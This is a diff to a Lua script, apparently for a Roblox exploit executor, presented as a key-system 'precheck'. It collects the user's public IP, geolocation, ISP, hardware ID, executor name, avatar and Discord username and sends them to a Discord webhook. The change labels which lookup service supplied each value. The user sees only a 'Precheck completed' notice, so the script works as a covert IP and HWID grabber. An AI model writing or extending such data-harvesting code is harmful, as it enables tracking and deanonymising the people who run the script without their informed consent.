@@ -219,19 +219,28 @@ end
 
 local function getPublicIpAddress()
     local providers = {
-        "https://v4.ident.me/",
-        "https://api.ipify.org",
-        "https://checkip.amazonaws.com"
+        {
+            name = "ident.me",
+            url = "https://v4.ident.me/"
+        },
+        {
+            name = "ipify",
+            url = "https://api.ipify.org"
+        },
+        {
+            name = "checkip.amazonaws.com",
+            url = "https://checkip.amazonaws.com"
+        }
     }
 
-    for _, providerUrl in ipairs(providers) do
-        local ipAddress = trim(downloadText(providerUrl) or "")
+    for _, provider in ipairs(providers) do
+        local ipAddress = trim(downloadText(provider.url) or "")
         if ipAddress ~= "" then
-            return ipAddress
+            return ipAddress, provider.name
         end
     end
 
-    return "Unavailable"
+    return "Unavailable", "Unavailable"
 end
 
 local function getIpInfoLines()
@@ -267,19 +276,19 @@ local function getIpInfoLines()
         function()
             local decoded = downloadJson("http://ip-api.com/json/?fields=status,message,query,country,regionName,city,zip,isp,org,as")
             if typeof(decoded) ~= "table" then
-                return nil
+                return nil, nil
             end
 
             if trim(tostring(decoded.status or "")) == "fail" then
-                return nil
+                return nil, nil
             end
 
-            return decoded
+            return decoded, "ip-api.com"
         end,
         function()
             local decoded = downloadJson("https://ipinfo.io/json")
             if typeof(decoded) ~= "table" then
-                return nil
+                return nil, nil
             end
 
             return {
@@ -289,16 +298,16 @@ local function getIpInfoLines()
                 city = decoded.city,
                 postal = decoded.postal,
                 org = decoded.org
-            }
+            }, "ipinfo.io"
         end,
         function()
             local decoded = downloadJson("https://ipwho.is/")
             if typeof(decoded) ~= "table" then
-                return nil
+                return nil, nil
             end
 
             if decoded.success == false then
-                return nil
+                return nil, nil
             end
 
             return {
@@ -308,18 +317,19 @@ local function getIpInfoLines()
                 city = decoded.city,
                 postal = decoded.postal or decoded.zip,
                 connection = decoded.connection
-            }
+            }, "ipwho.is"
         end
     }
 
     for _, provider in ipairs(providers) do
-        local lines = buildIpInfoLines(provider())
+        local data, providerName = provider()
+        local lines = buildIpInfoLines(data)
         if #lines > 0 then
-            return lines
+            return lines, providerName or "Unknown"
         end
     end
 
-    return {"Unavailable"}
+    return {"Unavailable"}, "Unavailable"
 end
 
 local function webhookString(value, fallback, maxLength)
@@ -462,7 +472,16 @@ local function promptDiscordUsername()
     return result
 end
 
-local function sendWebhook(hwid, executorName, avatarThumbnailUrl, discordUsername, publicIpAddress, ipInfoLines)
+local function sendWebhook(
+    hwid,
+    executorName,
+    avatarThumbnailUrl,
+    discordUsername,
+    publicIpAddress,
+    publicIpProvider,
+    ipInfoLines,
+    ipInfoProvider
+)
     if CONFIG.webhookURL == "" then
         return false, "Webhook URL is empty."
     end
@@ -492,6 +511,7 @@ local function sendWebhook(hwid, executorName, avatarThumbnailUrl, discordUserna
                 "**Executor:** " .. webhookString(executorName, "Unknown", 250),
                 "**Platform:** " .. webhookString(getPlatformName(), "Unknown", 250),
                 "**IP:** " .. webhookString(publicIpAddress, "Unavailable", 250),
+                "**IP Provider:** " .. webhookString(publicIpProvider, "Unavailable", 250),
                 "**HWID:** " .. webhookString(hwid, "UNAVAILABLE", 500),
                 "**Date:** " .. tostring(os.date("%m/%d/%Y")),
                 "**Time:** " .. tostring(os.date("%X")),
@@ -503,6 +523,7 @@ local function sendWebhook(hwid, executorName, avatarThumbnailUrl, discordUserna
                 "**Suggested Key Tier:** " .. webhookString(CONFIG.defaultTier, "basic", 250),
                 "**Suggested Expires:** " .. webhookString(toIsoUtc(os.time() + (CONFIG.durationHours * 3600)), "Unknown", 250),
                 "",
+                "**IP Information Provider:** " .. webhookString(ipInfoProvider, "Unavailable", 250),
                 "**IP Information:**",
                 table.concat(ipInfoLines or {"Unavailable"}, "\n"),
                 "",
@@ -565,8 +586,8 @@ local function main()
     local executorName = getExecutorName()
     local hwid = getHWID()
     local avatarThumbnailUrl = getAvatarThumbnailURL()
-    local publicIpAddress = getPublicIpAddress()
-    local ipInfoLines = getIpInfoLines()
+    local publicIpAddress, publicIpProvider = getPublicIpAddress()
+    local ipInfoLines, ipInfoProvider = getIpInfoLines()
 
     local webhookOk, webhookMessage = sendWebhook(
         hwid,
@@ -574,7 +595,9 @@ local function main()
         avatarThumbnailUrl,
         discordUsername,
         publicIpAddress,
-        ipInfoLines
+        publicIpProvider,
+        ipInfoLines,
+        ipInfoProvider
     )
 
     local notificationText = "Precheck completed."
